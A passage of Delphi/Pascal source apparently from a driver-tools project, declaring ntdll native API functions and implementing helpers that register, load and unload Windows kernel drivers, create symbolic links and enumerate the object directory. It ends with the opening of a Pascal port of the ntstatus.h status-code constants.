  {IN} CreateOptions: ULONG;
  {IN} EaBuffer: PVOID {OPTIONAL};
  {IN} EaLength: ULONG): NTSTATUS; stdcall; external ntdll;

function NtOpenFile(
  {OUT} var FileHandle: THANDLE;
  {IN} DesiredAccess: ACCESS_MASK;
  {IN} ObjectAttributes: POBJECT_ATTRIBUTES;
  {OUT} var IoStatusBlock: IO_STATUS_BLOCK;
  {IN} ShareAccess: ULONG;
  {IN} OpenOptions: ULONG): NTSTATUS; stdcall; external ntdll;

function NtReadFile(
  {IN} FileHandle: THANDLE;
  {IN} Event: THANDLE {OPTIONAL};
  {IN} ApcRoutine: PVOID {PIO_APC_ROUTINE} {OPTIONAL};
  {IN} ApcContext: PVOID {OPTIONAL};
  {OUT} var IoStatusBlock: IO_STATUS_BLOCK;
  {OUT} Buffer: PVOID;
  {IN} Length: ULONG;
  {IN} ByteOffset: PLARGE_INTEGER;
  {IN} Key: PULONG {OPTIONAL}): NTSTATUS; stdcall; external ntdll;

function NtWriteFile(
  {IN} FileHandle: THANDLE;
  {IN} Event: THANDLE; {OPTIONAL}
  {IN} ApcRoutine: PVOID; {PIO_APC_ROUTINE}{OPTIONAL}
  {IN} ApcContext: Pointer;  {OPTIONAL}
  {OUT} var IoStatusBlock: IO_STATUS_BLOCK;
  {OUT} Buffer: Pointer;
  {IN} Length: ULONG;
  {IN} FileOffset: PLARGE_INTEGER;
  {IN}  Key: PDWORD {OPTIONAL}
  ): NTSTATUS; stdcall; external ntdll;

function NtDeviceIoControlFile(
  {IN} DeviceHandle: THANDLE;
  {IN} Event: THANDLE; {OPTIONAL}
  {IN} ApcRoutine: PVOID; {PIO_APC_ROUTINE} {OPTIONAL}
  {IN} ApcContext: PVOID; {OPTIONAL}
  {OUT} IoStatusBlock: PIO_STATUS_BLOCK;
  {IN} IoControlCode: ULONG;
  {IN} InputBuffer: PVOID;
  {IN} InputBufferSize: ULONG;
  {IN} OutputBuffer: PVOID;
  {IN} OutputBufferSize: ULONG): NTSTATUS; stdcall; external ntdll;

function NtCreateSymbolicLinkObject(
  {OUT} var LinkHandle: THANDLE;
  {IN} DesiredAccess: ACCESS_MASK;
  {IN} ObjectAttributes: POBJECT_ATTRIBUTES;
  {IN} LinkTarget: PUNICODE_STRING): NTSTATUS; stdcall; external ntdll;

function NtOpenProcessToken(
  {IN} ProcessHandle: THANDLE;
  {IN} DesiredAccess: ACCESS_MASK;
  {IN} TokenHandle: PHANDLE): NTSTATUS; stdcall; external ntdll;

function NtOpenThreadToken(
  {IN} hThread: THANDLE;
  {IN} DesiredAccess: ACCESS_MASK;
  {IN} bOpenAsSelf: boolean;
  {OUT} var phToken: THANDLE): NTSTATUS; stdcall; external ntdll;

function NtAdjustPrivilegesToken(
  {IN} TokenHandle: THANDLE;
  {IN} DisableAllPrivileges: boolean;
  {IN} NewState: Pointer;
  {IN} BufferLength: ULONG;
  {IN} PreviousState: Pointer;
  {IN} var ReturnLength: ULONG): NTSTATUS; stdcall; external ntdll;

function NtQueryInformationToken(
  {IN} TokenHandle: THANDLE;
  {IN} TokenInformationClass: TOKEN_INFORMATION_CLASS;
  {IN} TokenInformation: PVOID;
  {IN} TokenInformationLength: ULONG;
  {OUT} ReturnLength: PULONG): NTSTATUS; stdcall; external ntdll;

function NtClose(
  {IN} Handle: HANDLE): NTSTATUS; stdcall; external ntdll;

function NtQueryDirectoryObject(
  {IN} DirectoryHandle: THANDLE;
  {IN} Buffer: PVOID;
  {IN} Length: ULONG;
  {IN} ReturnSingleEntry: boolean;
  {IN} RestartScan: boolean;
  {OUT} Context: PULONG;
  {OUT} ReturnLength: PULONG): NTSTATUS; stdcall; external ntdll;

function NtOpenDirectoryObject(
  {OUT} DirectoryHandle: PHANDLE;
  {IN} AccessMask: ACCESS_MASK;
  {IN} ObjectAttributes: POBJECT_ATTRIBUTES): NTSTATUS; stdcall; external ntdll;

function RtlAdjustPrivilege(
  {IN} Privilege: DWORD;
  {IN} NewValue: boolean;
  {IN} ForThread: boolean;
  {IN} var OldValue: boolean): NTSTATUS; stdcall; external ntdll;

function RtlDosPathNameToNtPathName_U(
  {IN} DosName: PCWSTR;
  {IN} NtName: PUNICODE_STRING;
  {IN} ShortName: PWSTR;
  {IN} CurrentDirectory: PCURDIR): boolean; stdcall external ntdll;

procedure RtlFreeAnsiString(
  {IN} DestinationString: PANSI_STRING); stdcall; external ntdll;

procedure RtlFreeUnicodeString(
  {IN} DestinationString: PUNICODE_STRING); stdcall; external ntdll;

function RtlAllocateAndInitializeSid(
  {IN} IdentifierAuthority: PSID_IDENTIFIER_AUTHORITY;
  {IN} SubAuthorityCount: UCHAR;
  {IN} SubAuthority0: ULONG;
  {IN} SubAuthority1: ULONG;
  {IN} SubAuthority2: ULONG;
  {IN} SubAuthority3: ULONG;
  {IN} SubAuthority4: ULONG;
  {IN} SubAuthority5: ULONG;
  {IN} SubAuthority6: ULONG;
  {IN} SubAuthority7: ULONG;
  {IN} Sid: PSID //pointer to PSID
  ): NTSTATUS; stdcall; external ntdll;

function RtlAllocateHeap(
  {IN} HeapHandle: THANDLE;
  {IN} Flags: ULONG;
  {IN} Size: SIZE_T): PVOID; stdcall external ntdll;

function RtlFreeHeap(
  {IN} HeapHandle: THANDLE;
  {IN} Flags: ULONG;
  {IN} HeapBase: PVOID): boolean; stdcall; external ntdll;

function RtlGetVersion(
  {IN} lpVersionInformation: POSVERSIONINFOW): DWORD; stdcall; external ntdll;

procedure InitializeObjectAttributes(
  {IN} var aObjectAttr: OBJECT_ATTRIBUTES;
  {IN} aName: PUNICODE_STRING;
  {IN} aAttributes: ULONG;
  {IN} aRootDir: HANDLE;
  {IN} aSecurity: PSECURITY_DESCRIPTOR = nil {OPTIONAL}); register;

function NT_SUCCESS(Status: NTSTATUS): boolean; register;
function NT_INFORMATION(Status: NTSTATUS): boolean; register;
function NT_WARNING(Status: NTSTATUS): boolean; register;
function NT_ERROR(Status: NTSTATUS): boolean; register;

function supHeapAlloc(Size: SIZE_T): PVOID;
function supHeapFree(Memory: PVOID): boolean;

function ntsupCreateDriverEntry(Name: LPCWSTR; ErrorControl: DWORD;
  StartType: DWORD; ImagePath: LPCWSTR; DisplayName: LPCWSTR;
  ConvertImagePath: boolean = False): NTSTATUS;

function ntsupRemoveDriverEntry(Name: LPCWSTR): NTSTATUS;

function ntsupOpenDevice(DeviceName: LPCWSTR; DesiredAccess: ACCESS_MASK;
  var DeviceHandle: THANDLE): NTSTATUS;

function ntsupOpenDeviceEx(DeviceName: LPCWSTR; DesiredAccess: ACCESS_MASK;
  var DeviceHandle: THANDLE): NTSTATUS;

function ntsupLoadDriverEx(DriverName: LPCWSTR; ImagePath: LPCWSTR;
  DisplayName: LPCWSTR; ErrorControl: DWORD; StartType: DWORD;
  UnloadPreviousInstance: boolean; ConvertImagePath: boolean): NTSTATUS;

function ntsupLoadDriver(DriverName: LPCWSTR; UnloadPreviousInstance: boolean): NTSTATUS;

function ntsupUnloadDriverEx(DriverName: LPCWSTR; RemoveEntry: boolean): NTSTATUS;
function ntsupUnloadDriver(DriverName: LPCWSTR): NTSTATUS;

function ntsupCreateSymbolicLink(var LinkHanlde: THANDLE; LinkName: LPCWSTR;
  LinkTarget: LPCWSTR): NTSTATUS;

function ntsupOpenDirectory(var DirectoryHandle: THANDLE;
  RootDirectoryHandle: THANDLE; DirectoryName: PWidechar;
  DesiredAccess: ACCESS_MASK): NTSTATUS;

function ntsupGetCurrentProcessToken(): THANDLE;

type
  EnumObjectsContext = record
    UserContext: PVOID;
    ObjectPathName: PWideChar;
  end;
  PEnumObjectsContext = ^EnumObjectsContext;

  PEnumObjectsCallback = function(Entry: POBJECT_DIRECTORY_INFORMATION;
    Context: PEnumObjectsContext): BOOL; stdcall;

function ntsupEnumerateObjects(RootDirectory: PWideChar;
  CallbackProc: PEnumObjectsCallback; CallbackContext: PEnumObjectsContext): BOOL;

implementation

procedure InitializeObjectAttributes(var aObjectAttr: OBJECT_ATTRIBUTES;
  aName: PUNICODE_STRING; aAttributes: ULONG; aRootDir: HANDLE;
  aSecurity: PSECURITY_DESCRIPTOR = nil); register;
begin
  with aObjectAttr do
  begin
    Length := SizeOf(OBJECT_ATTRIBUTES);
    RootDirectory := aRootDir;
    Attributes := aAttributes;
    ObjectName := aName;
    SecurityDescriptor := aSecurity;
    SecurityQualityOfService := nil;
  end;
end;

function NT_SUCCESS(Status: NTSTATUS): boolean; register;
begin
  Result := Status >= 0;
end;

function NT_INFORMATION(Status: NTSTATUS): boolean; register;
begin
  Result := ULONG(Status) shr 30 = 1;
end;

function NT_WARNING(Status: NTSTATUS): boolean; register;
begin
  Result := ULONG(Status) shr 30 = 2;
end;

function NT_ERROR(Status: NTSTATUS): boolean; register;
begin
  Result := ULONG(Status) shr 30 = 3;
end;

procedure RtlInitEmptyUnicodeString(InputBuffer: PWSTR; InputSize: DWORD;
  var UString: UNICODE_STRING);
begin
  with UString do
  begin
    Length := 0;
    MaximumLength := InputSize;
    Buffer := InputBuffer;
  end;
end;

function supHeapAlloc(Size: SIZE_T): PVOID;
begin
  Result := RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);
end;

function supHeapFree(Memory: PVOID): boolean;
begin
  Result := RtlFreeHeap(GetProcessHeap(), 0, Memory);
end;

function ntsupOpenDeviceEx(DeviceName: LPCWSTR; DesiredAccess: ACCESS_MASK;
  var DeviceHandle: THANDLE): NTSTATUS;
var
  usDeviceLink: UNICODE_STRING;
  objAttr: OBJECT_ATTRIBUTES;
  iost: IO_STATUS_BLOCK;
begin
  if (DeviceName <> nil) then
  begin

    with iost do
    begin
      Status := 0;
      uInformation := 0;
    end;

    RtlInitUnicodeString(@usDeviceLink, DeviceName);
    InitializeObjectAttributes(objAttr, @usDeviceLink, OBJ_CASE_INSENSITIVE, 0, nil);

    Result := NtCreateFile(DeviceHandle, DesiredAccess, @objAttr,
      iost, nil, 0, 0, FILE_OPEN, 0, nil, 0);
  end
  else
  begin
    Result := STATUS_INVALID_PARAMETER_1;
  end;
end;

function ntsupOpenDevice(DeviceName: LPCWSTR; DesiredAccess: ACCESS_MASK;
  var DeviceHandle: THANDLE): NTSTATUS;
var
  deviceLink: string;
begin
  if (DeviceName <> nil) then
  begin

    try
      deviceLink := Format('\Device\%S', [DeviceName]);
    except
      Result := STATUS_INVALID_PARAMETER_1;
      exit;
    end;

    Result := ntsupOpenDeviceEx(PWideChar(WideString(deviceLink)),
      DesiredAccess, DeviceHandle);

  end
  else
  begin
    Result := STATUS_INVALID_PARAMETER_1;
  end;
end;

function ntsupCreateDriverEntry(Name: LPCWSTR; ErrorControl: DWORD;
  StartType: DWORD; ImagePath: LPCWSTR; DisplayName: LPCWSTR;
  ConvertImagePath: boolean = False): NTSTATUS;
label
  Cleanup;
var
  driverImagePath: UNICODE_STRING;
  dwResult, dwData: DWORD;
  status: NTSTATUS;
  keyHandle: HKEY;
begin

  //mandatory
  if (Name = nil) then
  begin
    Result := STATUS_INVALID_PARAMETER_1;
    exit;
  end;

  if (ConvertImagePath) then
  begin

    with driverImagePath do
    begin
      Buffer := nil;
      Length := 0;
      MaximumLength := 0;
    end;

    if (ImagePath <> nil) then
    begin
      if (not RtlDosPathNameToNtPathName_U(ImagePath, @driverImagePath, nil, nil)) then
      begin
        Result := STATUS_INVALID_PARAMETER_2;
        exit;
      end;
    end;

  end
  else
  begin
    if (ImagePath <> nil) then
    begin
      RtlInitUnicodeString(@driverImagePath, ImagePath);
    end
    else
    begin
      //mandatory in case of symlink usage
      Result := STATUS_INVALID_PARAMETER_4;
      exit;
    end;
  end;

  keyHandle := 0;

  dwResult := RegCreateKeyExW(HKEY_LOCAL_MACHINE, Name, 0, nil,
    REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, nil, keyHandle, nil);
  if (dwResult <> ERROR_SUCCESS) then
  begin
    status := STATUS_ACCESS_DENIED;
    goto Cleanup;
  end;

  repeat

    dwResult := RegSetValueExW(keyHandle, 'ErrorControl', 0, REG_DWORD,
      @ErrorControl, sizeof(DWORD));

    if (dwResult <> ERROR_SUCCESS) then
      break;

    dwData := SERVICE_KERNEL_DRIVER;

    dwResult := RegSetValueExW(keyHandle, 'Type', 0, REG_DWORD,
      @dwData, sizeof(DWORD));

    if (dwResult <> ERROR_SUCCESS) then
      break;

    dwResult := RegSetValueExW(keyHandle, 'Start', 0, REG_DWORD,
      @StartType, sizeof(DWORD));

    if (dwResult <> ERROR_SUCCESS) then
      break;

    if (DisplayName <> nil) then
    begin
      //optional param, we do not check API result
      RegSetValueExW(keyHandle, 'DisplayName', 0, REG_SZ,
        DisplayName, StrLen(DisplayName) + 1);
    end;

    if (ImagePath <> nil) then
    begin
      dwResult := RegSetValueExW(keyHandle, 'ImagePath', 0, REG_SZ,
        driverImagePath.Buffer, driverImagePath.Length + sizeof(WCHAR));
    end;

  until (True);

  RegCloseKey(keyHandle);

  if (dwResult <> ERROR_SUCCESS) then
  begin
    status := STATUS_ACCESS_DENIED;
  end
  else
  begin
    status := STATUS_SUCCESS;
  end;

  Cleanup:
    if (ConvertImagePath) then
    begin
      if (ImagePath <> nil) and (driverImagePath.Buffer <> nil) then
      begin
        RtlFreeUnicodeString(@driverImagePath);
      end;
    end;

  Result := status;
end;

function ntsupRemoveDriverEntry(Name: LPCWSTR): NTSTATUS;
var
  S: string;
  lResult: LONG;
  keyHandle: HKEY;
  lpSubKey: LPWSTR;
begin
  try
    S := Format(WIN32_CURRENTCONTROL_SERVICES, [Name]);
  except
    Result := STATUS_INVALID_PARAMETER;
    exit;
  end;

  lpSubKey := PWideChar(WideString(S));

  keyHandle := 0;
  lResult := RegOpenKeyEx(HKEY_LOCAL_MACHINE, nil, REG_OPTION_NON_VOLATILE,
    SERVICE_DELETE or KEY_ENUMERATE_SUB_KEYS or KEY_QUERY_VALUE, keyHandle);

  if (lResult = ERROR_SUCCESS) then
  begin
    lResult := RegDeleteTreeW(keyHandle, lpSubKey);
    RegCloseKey(keyHandle);
  end;

  if (lResult = ERROR_SUCCESS) then
    Result := STATUS_SUCCESS
  else
    Result := STATUS_UNSUCCESSFUL;

end;

function ntsupLoadDriverEx(DriverName: LPCWSTR; ImagePath: LPCWSTR;
  DisplayName: LPCWSTR; ErrorControl: DWORD; StartType: DWORD;
  UnloadPreviousInstance: boolean; ConvertImagePath: boolean): NTSTATUS;
var
  keyOffset: DWORD;
  usDrvKey: UNICODE_STRING;
  drvName: string;
begin

  //mandatory
  if (DriverName = nil) then
  begin
    Result := STATUS_INVALID_PARAMETER_1;
    exit;
  end;

  //mandatory
  if (ImagePath = nil) then
  begin
    Result := STATUS_INVALID_PARAMETER_2;
    exit;
  end;

  keyOffset := StrLen(NT_REGISTRY_MACHINE);

  try

    drvName := Format('%S\' + WIN32_CURRENTCONTROL_SERVICES,
      [NT_REGISTRY_MACHINE, DriverName]);

  except
    Result := STATUS_INTERNAL_ERROR;
    exit;
  end;

  Result := ntsupCreateDriverEntry(@DriverName[keyOffset], ErrorControl,
    StartType, ImagePath, DisplayName, ConvertImagePath);

  if not NT_SUCCESS(Result) then
    exit;

  RtlInitUnicodeString(@usDrvKey, PWideChar(WideString(drvName)));
  Result := NtLoadDriver(@usDrvKey);

  if (UnloadPreviousInstance) then
  begin

    if ((Result = STATUS_IMAGE_ALREADY_LOADED) or
      (Result = STATUS_OBJECT_NAME_COLLISION) or
      (Result = STATUS_OBJECT_NAME_EXISTS)) then
    begin
      Result := NtUnloadDriver(@usDrvKey);

      if (NT_SUCCESS(Result)) then
      begin
        Result := NtLoadDriver(@usDrvKey);
      end;

    end;

  end
  else
  begin
    if (Result = STATUS_OBJECT_NAME_EXISTS) then
      Result := STATUS_SUCCESS;
  end;

end;

function ntsupLoadDriver(DriverName: LPCWSTR; UnloadPreviousInstance: boolean): NTSTATUS;
var
  usDrvKey: UNICODE_STRING;
  drvName: string;
begin

  try
    drvName := Format('%S\' + WIN32_CURRENTCONTROL_SERVICES,
      [NT_REGISTRY_MACHINE, DriverName]);
  except
    Result := STATUS_INTERNAL_ERROR;
    exit;
  end;

  RtlInitUnicodeString(@usDrvKey, PWideChar(WideString(drvName)));
  Result := NtLoadDriver(@usDrvKey);

  if (UnloadPreviousInstance) then
  begin

    if ((Result = STATUS_IMAGE_ALREADY_LOADED) or
      (Result = STATUS_OBJECT_NAME_COLLISION) or
      (Result = STATUS_OBJECT_NAME_EXISTS)) then
    begin
      Result := NtUnloadDriver(@usDrvKey);

      if (NT_SUCCESS(Result)) then
      begin
        Result := NtLoadDriver(@usDrvKey);
      end;

    end;

  end
  else
  begin
    if (Result = STATUS_OBJECT_NAME_EXISTS) then
      Result := STATUS_SUCCESS;
  end;
end;

function ntsupUnloadDriverEx(DriverName: LPCWSTR; RemoveEntry: boolean): NTSTATUS;
var
  keyOffset: DWORD;
  usDrvKey: UNICODE_STRING;
  drvName: string;
begin
  //mandatory
  if (DriverName = nil) then
  begin
    Result := STATUS_INVALID_PARAMETER_1;
    exit;
  end;

  keyOffset := StrLen(NT_REGISTRY_MACHINE);

  try

    drvName := Format('%S\' + WIN32_CURRENTCONTROL_SERVICES,
      [NT_REGISTRY_MACHINE, DriverName]);

  except
    Result := STATUS_INTERNAL_ERROR;
    exit;
  end;

  Result := ntsupCreateDriverEntry(@DriverName[keyOffset], 0, 0, nil, nil, False);
  if not NT_SUCCESS(Result) then
    exit;

  RtlInitUnicodeString(@usDrvKey, PWideChar(WideString(drvName)));
  Result := NtUnloadDriver(@usDrvKey);

  if (NT_SUCCESS(Result) and RemoveEntry) then
  begin
    RegDeleteTreeW(HKEY_LOCAL_MACHINE, PWideChar(WideString(drvName[keyOffset])));
  end;

end;

function ntsupUnloadDriver(DriverName: LPCWSTR): NTSTATUS;
var
  usDrvKey: UNICODE_STRING;
  drvName: string;
begin
  //mandatory
  if (DriverName = nil) then
  begin
    Result := STATUS_INVALID_PARAMETER_1;
    exit;
  end;

  try

    drvName := Format('%S\' + WIN32_CURRENTCONTROL_SERVICES,
      [NT_REGISTRY_MACHINE, DriverName]);

  except
    Result := STATUS_INTERNAL_ERROR;
    exit;
  end;

  RtlInitUnicodeString(@usDrvKey, PWideChar(WideString(drvName)));
  Result := NtUnloadDriver(@usDrvKey);
end;

function ntsupCreateSymbolicLink(var LinkHanlde: THANDLE; LinkName: LPCWSTR;
  LinkTarget: LPCWSTR): NTSTATUS;
var
  objAttr: OBJECT_ATTRIBUTES;
  usTarget, usLink: UNICODE_STRING;
begin
  if (not RtlDosPathNameToNtPathName_U(LinkTarget, @usTarget, nil, nil)) then
  begin
    Result := STATUS_INVALID_PARAMETER_2;
    exit;
  end;

  RtlInitUnicodeString(@usLink, LinkName);
  InitializeObjectAttributes(objAttr, @usLink, OBJ_CASE_INSENSITIVE, 0, nil);

  Result := NtCreateSymbolicLinkObject(LinkHanlde, SYMBOLIC_LINK_ALL_ACCESS,
    @objAttr, @usTarget);
end;

function ntsupGetCurrentProcessToken(): THANDLE;
begin
  Result := 0;
  NtOpenProcessToken(NtCurrentProcess, TOKEN_QUERY, @Result);
end;

function ntsupOpenDirectory(var DirectoryHandle: THANDLE;
  RootDirectoryHandle: THANDLE; DirectoryName: PWidechar;
  DesiredAccess: ACCESS_MASK): NTSTATUS;
var
  status: NTSTATUS;
  dirHandle: THANDLE;
  usDirectory: UNICODE_STRING;
  objectAttrbutes: OBJECT_ATTRIBUTES;
begin

  DirectoryHandle := 0;
  RtlInitUnicodeString(@usDirectory, DirectoryName);
  InitializeObjectAttributes(objectAttrbutes, @usDirectory,
    OBJ_CASE_INSENSITIVE, RootDirectoryHandle, nil);

  status := NtOpenDirectoryObject(@dirHandle, DesiredAccess, @objectAttrbutes);

  if (NT_SUCCESS(status)) then
    DirectoryHandle := dirHandle;

  Result := status;

end;

function ntsupEnumerateObjects(RootDirectory: PWideChar;
  CallbackProc: PEnumObjectsCallback; CallbackContext: PEnumObjectsContext): BOOL;
label
  ExitProc;
var
  bStop: boolean;
  dirHandle: THANDLE;
  status: NTSTATUS;
  ctx, rLength: DWORD;
  infoBuffer: POBJECT_DIRECTORY_INFORMATION;
  usDirectory: UNICODE_STRING;
  sdlen: ULONG;
  newdir, objname: PWideChar;
begin
  bStop := False;
  Result := False;
  dirHandle := 0;
  status := ntsupOpenDirectory(dirHandle, 0, RootDirectory, DIRECTORY_QUERY);

  if (not NT_SUCCESS(status)) then
    exit;

  sdlen := StrLen(RootDirectory);

  RtlInitUnicodeString(@usDirectory, OBJECT_TYPE_DIRECTORY);
  ctx := 0;

  repeat

    rLength := 0;
    status := NtQueryDirectoryObject(dirHandle, nil, 0, True, False,
      @ctx, @rLength);

    if (status <> STATUS_BUFFER_TOO_SMALL) then
      goto ExitProc;

    infoBuffer := supHeapAlloc(rLength);
    if (infoBuffer = nil) then
      break;

    status := NtQueryDirectoryObject(dirHandle, infoBuffer, rLength,
      True, False, @ctx, @rLength);

    if (not NT_SUCCESS(status)) then
    begin
      supHeapFree(infoBuffer);
      break;
    end;

    objname := supHeapAlloc((sdlen + 4) * sizeof(WCHAR) + infoBuffer^.Name.Length);
    if (objname <> nil) then
    begin

      StrCopy(objname, RootDirectory);
      if ((RootDirectory[0] = '\') and (RootDirectory[1] = #0)) then
      begin
        StrLCopy(objname + sdlen, infoBuffer^.Name.Buffer,
          infoBuffer^.Name.Length div sizeof(WCHAR));
      end
      else
      begin
        objname[sdlen] := '\';
        StrLCopy(objname + sdlen + 1, infoBuffer^.Name.Buffer,
          infoBuffer^.Name.Length div sizeof(WCHAR));
      end;

      CallbackContext^.ObjectPathName := objname;

      bStop := CallbackProc(infoBuffer, CallbackContext);

      supHeapFree(objname);
    end;


    if (RtlEqualUnicodeString(@infoBuffer^.TypeName, @usDirectory, True)) then
    begin

      newdir := supHeapAlloc((sdlen + 4) * sizeof(WCHAR) + infoBuffer^.Name.Length);
      if (newdir <> nil) then
      begin
        StrCopy(newdir, RootDirectory);
        if ((RootDirectory[0] = '\') and (RootDirectory[1] = #0)) then
        begin
          StrLCopy(newdir + sdlen, infoBuffer^.Name.Buffer,
            infoBuffer^.Name.Length div sizeof(WCHAR));
        end
        else
        begin
          newdir[sdlen] := '\';
          StrLCopy(newdir + sdlen + 1, infoBuffer^.Name.Buffer,
            infoBuffer^.Name.Length div sizeof(WCHAR));
        end;

        Result := ntsupEnumerateObjects(newdir, CallbackProc, CallbackContext);

        supHeapFree(newdir);

      end;

    end;

    supHeapFree(infoBuffer);

    if (bStop) then
      break;

  until (False);

  ExitProc:
    NtClose(dirHandle);
end;

end.

```

`source/DrvTools/src/ntstatus.inc`:

```inc
{*++ BUILD Version: 0005    // Increment this if a change has global effects

Copyright (c) Microsoft Corporation. All rights reserved.

Module Name:

    ntstatus.h

Abstract:

    Constant definitions for the NTSTATUS values.

Author:

    Portable Systems Group 30-Mar-1989

Revision History:

Notes:

    This file is generated by the MC tool from the ntstatus.mc file.

    Please add new error values to the end of the file. To do otherwise
    will jumble the error values.

    This file has been converted from original ntstatus.h by UG North in 2004
    for Win32Pascal and updated since then.

--*}

/////////////////////////////////////////////////////////////////////////
//
// Please update FACILITY_MAXIMUM_VALUE when adding new facility values.
//     (This value should be greater than the highest value above)
//
// Facility 0x17 is reserved and used in isolation lib as
//             PIE=0x17:FACILITY_MANIFEST_ERROR_CODE
//
//
/////////////////////////////////////////////////////////////////////////

/////////////////////////////////////////////////////////////////////////
//
// Standard Success values
//
//
/////////////////////////////////////////////////////////////////////////

const

//
// The success status codes 0 - 63 are reserved for wait completion status.
// FacilityCodes 0x5 - 0xF have been allocated by various drivers.
//
STATUS_WAIT_0                           = NTSTATUS($00000000); // winnt

//
//  Values are 32 bit values laid out as follows:
//
//   3 3 2 2 2 2 2 2 2 2 2 2 1 1 1 1 1 1 1 1 1 1
//   1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0
//  +---+-+-+-----------------------+-------------------------------+
//  |Sev|C|R|     Facility          |               Code            |
//  +---+-+-+-----------------------+-------------------------------+
//
//  where
//
//      Sev - is the severity code
//
//          00 - Success
//          01 - Informational
//          10 - Warning
//          11 - Error
//
//      C - is the Customer code flag
//
//      R - is a reserved bit
//
//      Facility - is the facility code
//
//      Code - is the facility's status code
//
//
// Define the facility codes
//
FACILITY_DEBUGGER                = NTSTATUS($1);
FACILITY_RPC_RUNTIME             = NTSTATUS($2);
FACILITY_RPC_STUBS               = NTSTATUS($3);
FACILITY_IO_ERROR_CODE           = NTSTATUS($4);
FACILITY_CODCLASS_ERROR_CODE     = NTSTATUS($6);
FACILITY_NTWIN32                 = NTSTATUS($7);
FACILITY_NTCERT                  = NTSTATUS($8);
FACILITY_NTSSPI                  = NTSTATUS($9);
FACILITY_TERMINAL_SERVER         = NTSTATUS($A);
FACILTIY_MUI_ERROR_CODE          = NTSTATUS($B);
FACILITY_USB_ERROR_CODE          = NTSTATUS($10);
FACILITY_HID_ERROR_CODE          = NTSTATUS($11);
FACILITY_FIREWIRE_ERROR_CODE     = NTSTATUS($12);
FACILITY_CLUSTER_ERROR_CODE      = NTSTATUS($13);
FACILITY_ACPI_ERROR_CODE         = NTSTATUS($14);
FACILITY_SXS_ERROR_CODE          = NTSTATUS($15);
FACILITY_TRANSACTION             = NTSTATUS($19);
FACILITY_COMMONLOG               = NTSTATUS($1A);
FACILITY_VIDEO                   = NTSTATUS($1B);
FACILITY_FILTER_MANAGER          = NTSTATUS($1C);
FACILITY_MONITOR                 = NTSTATUS($1D);
FACILITY_GRAPHICS_KERNEL         = NTSTATUS($1E);
FACILITY_DRIVER_FRAMEWORK        = NTSTATUS($20);
FACILITY_FVE_ERROR_CODE          = NTSTATUS($21);
FACILITY_FWP_ERROR_CODE          = NTSTATUS($22);
FACILITY_NDIS_ERROR_CODE         = NTSTATUS($23);
FACILITY_QUIC_ERROR_CODE         = NTSTATUS($24);
FACILITY_TPM                     = NTSTATUS($29);
FACILITY_RTPM                    = NTSTATUS($2A);
FACILITY_HYPERVISOR              = NTSTATUS($35);
FACILITY_IPSEC                   = NTSTATUS($36);
FACILITY_VIRTUALIZATION          = NTSTATUS($37);
FACILITY_VOLMGR                  = NTSTATUS($38);
FACILITY_BCD_ERROR_CODE          = NTSTATUS($39);
FACILITY_WIN32K_NTUSER           = NTSTATUS($3E);
FACILITY_WIN32K_NTGDI            = NTSTATUS($3F);
FACILITY_RESUME_KEY_FILTER       = NTSTATUS($40);
FACILITY_RDBSS                   = NTSTATUS($41);
FACILITY_BTH_ATT                 = NTSTATUS($42);
FACILITY_SECUREBOOT              = NTSTATUS($43);
FACILITY_AUDIO_KERNEL            = NTSTATUS($44);
FACILITY_VSM                     = NTSTATUS($45);
FACILITY_VOLSNAP                 = NTSTATUS($50);
FACILITY_SDBUS                   = NTSTATUS($51);
FACILITY_SHARED_VHDX             = NTSTATUS($5C);
FACILITY_SMB                     = NTSTATUS($5D);
FACILITY_XVS                     = NTSTATUS($5E);
FACILITY_INTERIX                 = NTSTATUS($99);
FACILITY_SPACES                  = NTSTATUS($E7);
FACILITY_SECURITY_CORE           = NTSTATUS($E8);
FACILITY_SYSTEM_INTEGRITY        = NTSTATUS($E9);
FACILITY_LICENSING               = NTSTATUS($EA);
FACILITY_PLATFORM_MANIFEST       = NTSTATUS($EB);
FACILITY_APP_EXEC                = NTSTATUS($EC);
FACILITY_MAXIMUM_VALUE           = NTSTATUS($ED);


//
// Define the severity codes
//
STATUS_SEVERITY_SUCCESS          = NTSTATUS($0);
STATUS_SEVERITY_INFORMATIONAL    = NTSTATUS($1);
STATUS_SEVERITY_WARNING          = NTSTATUS($2);
STATUS_SEVERITY_ERROR            = NTSTATUS($3);


//
// MessageId: STATUS_SUCCESS
//
// MessageText:
//
//  STATUS_SUCCESS
//
STATUS_SUCCESS                   = NTSTATUS($00000000);    // ntsubauth

//
// MessageId: STATUS_WAIT_1
//
// MessageText:
//
//  STATUS_WAIT_1
//
STATUS_WAIT_1                    = NTSTATUS($00000001);

//
// MessageId: STATUS_WAIT_2
//
// MessageText:
//
//  STATUS_WAIT_2
//
STATUS_WAIT_2                    = NTSTATUS($00000002);

//
// MessageId: STATUS_WAIT_3
//
// MessageText:
//
//  STATUS_WAIT_3
//
STATUS_WAIT_3                    = NTSTATUS($00000003);

//
// MessageId: STATUS_WAIT_63
//
// MessageText:
//
//  STATUS_WAIT_63
//
STATUS_WAIT_63                   = NTSTATUS($0000003F);


//
// The success status codes 128 - 191 are reserved for wait completion
// status with an abandoned mutant object.
//
STATUS_ABANDONED                        = NTSTATUS($00000080);

//
// MessageId: STATUS_ABANDONED_WAIT_0
//
// MessageText:
//
//  STATUS_ABANDONED_WAIT_0
//
STATUS_ABANDONED_WAIT_0          = NTSTATUS($00000080);    // winnt

//
// MessageId: STATUS_ABANDONED_WAIT_63
//
// MessageText:
//
//  STATUS_ABANDONED_WAIT_63
//
STATUS_ABANDONED_WAIT_63         = NTSTATUS($000000BF);


//
// The success status codes 256, 257, 258, and 258 are reserved for
// User APC, Kernel APC, Alerted, and Timeout.
//
//
// MessageId: STATUS_USER_APC
//
// MessageText:
//
//  STATUS_USER_APC
//
STATUS_USER_APC                  = NTSTATUS($000000C0);    // winnt

//
// MessageId: STATUS_ALREADY_COMPLETE
//
// MessageText:
//
// The requested action was completed by an earlier operation.
//
STATUS_ALREADY_COMPLETE          = NTSTATUS($000000FF);

//
// MessageId: STATUS_KERNEL_APC
//
// MessageText:
//
//  STATUS_KERNEL_APC
//
STATUS_KERNEL_APC                = NTSTATUS($00000100);

//
// MessageId: STATUS_ALERTED
//
// MessageText:
//
//  STATUS_ALERTED
//
STATUS_ALERTED                   = NTSTATUS($00000101);

//
